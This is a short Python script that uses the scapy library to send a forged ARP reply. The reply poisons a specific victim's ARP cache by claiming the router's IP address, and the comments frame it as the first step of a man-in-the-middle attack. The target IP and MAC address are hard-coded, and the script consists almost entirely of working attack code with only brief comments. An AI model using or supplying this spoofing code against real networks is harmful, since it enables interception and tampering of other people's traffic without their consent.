import scapy.all as scapy
# Be caution before attacking MITM - ip forwarding
# Scan the network and see the ip addr and mac of victim
# op - 2 means arp_request and response , pdst - target_ip ,hwdst - target mac address, psrc - router ip address
sample = scapy.ARP(op=2,pdst=" 10.32.242.227 ",hwdst="3c:a0:67:1c:41:43",psrc="10.32.242.154")
#scapy.ls(scapy.ARP())
scapy.send(sample) # sending packet (arp)